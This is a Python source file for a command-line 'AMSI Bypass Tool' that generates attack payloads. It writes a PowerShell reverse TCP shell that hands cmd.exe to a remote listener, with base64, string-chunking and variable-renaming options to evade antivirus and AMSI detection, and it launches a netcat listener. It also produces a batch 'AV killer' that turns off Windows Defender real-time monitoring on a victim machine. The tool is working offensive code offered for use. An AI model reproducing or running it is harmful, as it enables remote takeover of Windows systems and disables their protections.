import os.path, os, sys
from os import remove as rmfile
import socket
import platform, shutil, re, hashlib
import random
import argparse as ap
import string as st


banner = """
\x1B[3m\033[1mCopyright LukeProducts 2022, all rights reserved\x1B[0m
 ┌──────────────────────────────────────┐
 │                   ▼         ##       │
 │ ┌─────────────────┘    ┌────##───┐   │
 │ │AMSI Bypass Tool      │    ##   │   │
 │ └──────────────────────┘    ##   └─► │
 │                             ##       │
 │ \033[4m© Copyright by LukeProducts\033[0m ##       │
 └──────────────────────────────────────┘

"""
CHUNK_PROBABILITY = 0.01
VAR_ENCODING = "md5"

class UnkownHostOS(Exception):
    def __init__(self, ops,  errmessage = "The Host provides unsupported OS"): self.ops = ops; self.err = errmessage
    def __str__(self): return self.err + f" \"{self.ops}\""
def arg_init():
    app = ap.ArgumentParser()
    app.add_argument("-s", "--shelloutname", required=False, help = "Reverse Shell.  Value: fileoutputname. Requires: [-lh] [-lp], optional: [-b64] [-ch] [-v]")
    app.add_argument("-avkill", "--antiviruskill", required = False, help = "script to deactivate AV of victim if executed with admin privileges. Optional flag: [-b64] [-ch]")
    app.add_argument("-lh", "--localhost", required=False, help = "host for payload (\"lh\" for automatically assign host to this systems address)")
    app.add_argument("-lp", "--localport", required=False, help = "port for payload (4 digit number recommended)")
    app.add_argument("-b64", action = "store_true", help = "encodes payload to base64")
    app.add_argument("-ch", action = "store_true", required=False, help = "chunks up base64 encoded string (chunking probability in CHUNK_PROBABILITY)")
    app.add_argument("-v", "--varencode", action = "store_true", required=False, help = "changes all varuables names to an random 10 digit hex encoded into VAR_ENCODING encoding type (default is md5)")
    return vars(app.parse_args()), app

def encode_vars(string: str = "", encoding = VAR_ENCODING):
    matches = list(dict.fromkeys([i for i in re.findall("(\$\w*)", string) if i.lower() not in ["$null", "$true", "$false"] and len(i) > 1]))
    for match in matches: string = string.replace(match, "$" + hashlib.new(encoding, "".join([random.choice(st.hexdigits) for i in range(10)]).encode()).hexdigest())
    return string

def this_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ret = s.getsockname()[0]
    s.close()
    return ret

def chunk_up(prob:float = CHUNK_PROBABILITY, string: str = "", sep: str = "'"):
    res = ""
    for char in string: 
        res+=char
        if random.random() < prob and char != sep: res+=sep + " "*random.randint(0, int(prob*10)) + "+" + " "*random.randint(0, int(prob*10)) + sep
    return res

def encodebase64(string):
    open("bencode.ps1", "w").write("$MYTEXT = @'\n"  + string + "\n'@\n" + "[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($MYTEXT))")
    if not shutil.which('pwsh') != None and platform.system().lower() != "windows": print("[!] powershell seems not to be installed and is needed due to base64 encryption...\n[->] visit \"https://adamtheautomator.com/powershell-linux/\" to install it on your machine or compile without encryption");exit(-1)
    ret =  os.popen(f'{"powershell" if platform.system().lower() == "windows" else "pwsh"} -Command ".\\bencode.ps1"').read().strip().rstrip()
    rmfile("bencode.ps1")
    return ret

def shell_tcp(host, port, encode = False, chunk = False, varencode = False):
    top = f"powershell /w 1 /C \"" if not chunk else """powershell /w 1 /C \"$a=[scriptblock]::create([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('"""
    body = "function cleanup {if ($client.Connected -eq $true) {$client.Close();}if ($process.ExitCode -ne $null) {$process.Close();}exit;}$address = '" + host +"';$port = '" + port + "';$client = New-Object system.net.sockets.tcpclient;$client.connect($address,$port);$stream = $client.GetStream();$networkbuffer = New-Object System.Byte[] $client.ReceiveBufferSize;$process = New-Object System.Diagnostics.Process;$process.StartInfo.FileName = 'C:\\windows\\system32\\cmd.exe';$process.StartInfo.RedirectStandardInput = 1;$process.StartInfo.RedirectStandardOutput = 1;$process.StartInfo.UseShellExecute = 0;$process.Start();$inputstream = $process.StandardInput;$outputstream = $process.StandardOutput;Start-Sleep 1;$encoding = new-object System.Text.AsciiEncoding;while($outputstream.Peek() -ne -1){$out += $encoding.GetString($outputstream.Read());}$stream.Write($encoding.GetBytes($out),0,$out.Length);$out = $null; $done = $false; $testing = 0;while (-not $done) {if ($client.Connected -ne $true) {cleanup;}$pos = 0; $i = 1;while (($i -gt 0) -and ($pos -lt $networkbuffer.Length)) {$read = $stream.Read($networkbuffer,$pos,$networkbuffer.Length - $pos);$pos+=$read; if ($pos -and ($networkbuffer[0..$($pos-1)] -contains 10)) {break;}}if ($pos -gt 0) {$string = $encoding.GetString($networkbuffer,0,$pos);$inputstream.write($string);start-sleep 1;if ($process.ExitCode -ne $null) {cleanup;}else {$out = $encoding.GetString($outputstream.Read());while($outputstream.Peek() -ne -1){$out += $encoding.GetString($outputstream.Read()); if ($out -eq $string) {$out = '';}}$stream.Write($encoding.GetBytes($out),0,$out.length);$out = $null;$string = $null;}} else {cleanup;}}"
    finish = "\"" if  not chunk else """')));Invoke-Command -ScriptBlock $a\""""
    if varencode: body = encode_vars(string = body)
    if encode:
        body = encodebase64(body)
    if chunk and encode:
        body = chunk_up(string = body)
    return top + body + finish

def get_payload(name: str = "shell.bat", host = this_ip(), port = 4444, encode = False, chunk = False, varencode = False):
        open((name if name.endswith(".bat") else name + ".bat"), "w").write(shell_tcp(host, port, encode=encode, chunk=chunk, varencode=varencode))
        print(f"[*] Successfully exported payload to \"{name if name.endswith('.bat') else name + '.bat'}\"" + (" with encoding base64" if encode else ""))
        if shutil.which("nc") != None:
            os.system(f"nc -nlvp {port}") # windows: https://joncraton.org/blog/46/netcat-for-windows/ , linux: "sudo apt-get install netcat"
        else: print("[!] Netcat seems not to be installed...\n" + ("[->] visit \"https://joncraton.org/blog/46/netcat-for-windows/\" to install it on your windows machine\n[->] then, under \"Environment variables\" at \"Path\" add the folders path where the downloaded file \"nc.exe\" is located in" if platform.system().lower() == "windows" else "[->] type \"sudo apt-get install netcat\" to install it"))

def get_avkill(name :str = "", encode = False, chunk = False):
    open(name if name.endswith('.bat') else name + '.bat', "w").write(('powershell /w 1 /C "$user = [Security.Principal.WindowsIdentity]::GetCurrent(); if ((New-Object Security.Principal.WindowsPrincipal $user).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {Set-MpPreference -DisableRealtimeMonitoring $true;}"' 
        if not encode else ('powershell /w 1 /eC "JAB1AHMAZQByACAAPQAgAFsAUwBlAGMAdQByAGkAdAB5AC4AUAByAGkAbgBjAGkAcABhAGwALgBXAGkAbgBkAG8AdwBzAEkAZABlAG4AdABpAHQAeQBdADoAOgBHAGUAdABDAHUAcgByAGUAbgB0ACgAKQA7ACAAaQBmACAAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAGUAYwB1AHIAaQB0AHkALgBQAHIAaQBuAGMAaQBwAGEAbAAuAFcAaQBuAGQAbwB3AHMAUAByAGkAbgBjAGkAcABhAGwAIAAkAHUAcwBlAHIAKQAuAEkAcwBJAG4AUgBvAGwAZQAoAFsAUwBlAGMAdQByAGkAdAB5AC4AUAByAGkAbgBjAGkAcABhAGwALgBXAGkAbgBkAG8AdwBzAEIAdQBpAGwAdABpAG4AUgBvAGwAZQBdADoAOgBBAGQAbQBpAG4AaQBzAHQAcgBhAHQAbwByACkAKQAgAHsAUwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgACQAdAByAHUAZQA7AH0A"' 
        if not chunk else """powershell /w 1 /C "sv Hx -;sv yeq ec;sv eZe ((gv Hx).value.toString()+(gv yeq).value.toString());powershell (gv eZe).value.toString() ('""" + chunk_up(string = "JAB1AHMAZQByACAAPQAgAFsAUwBlAGMAdQByAGkAdAB5AC4AUAByAGkAbgBjAGkAcABhAGwALgBXAGkAbgBkAG8AdwBzAEkAZABlAG4AdABpAHQAeQBdADoAOgBHAGUAdABDAHUAcgByAGUAbgB0ACgAKQA7ACAAaQBmACAAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAGUAYwB1AHIAaQB0AHkALgBQAHIAaQBuAGMAaQBwAGEAbAAuAFcAaQBuAGQAbwB3AHMAUAByAGkAbgBjAGkAcABhAGwAIAAkAHUAcwBlAHIAKQAuAEkAcwBJAG4AUgBvAGwAZQAoAFsAUwBlAGMAdQByAGkAdAB5AC4AUAByAGkAbgBjAGkAcABhAGwALgBXAGkAbgBkAG8AdwBzAEIAdQBpAGwAdABpAG4AUgBvAGwAZQBdADoAOgBBAGQAbQBpAG4AaQBzAHQAcgBhAHQAbwByACkAKQAgAHsAUwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgACQAdAByAHUAZQA7AH0A") + "')\"")))
    print(f"[*] Successfully exported AV killer to \"{name if name.endswith('.bat') else name + '.bat'}\"" + (" with encoding base64" if encode else ""))



if __name__ == "__main__":
    print(banner)
    if platform.system().lower() not in ["windows", "linux"]: raise UnkownHostOS(platform.system())
    args, handle = arg_init()
    if not any(args.values()): handle.print_help()
    if args["shelloutname"] and args["localhost"] != None and args["localport"] != None: get_payload(name = args["shelloutname"], host = (args["localhost"] if args["localhost"] != "lh" else this_ip()), port = args["localport"], encode = args["b64"], chunk = args["ch"], varencode = args["varencode"])
    elif args["antiviruskill"]: get_avkill(args["antiviruskill"], encode = args["b64"], chunk = args["ch"])
    else: print("You've not entered an valid command!")
    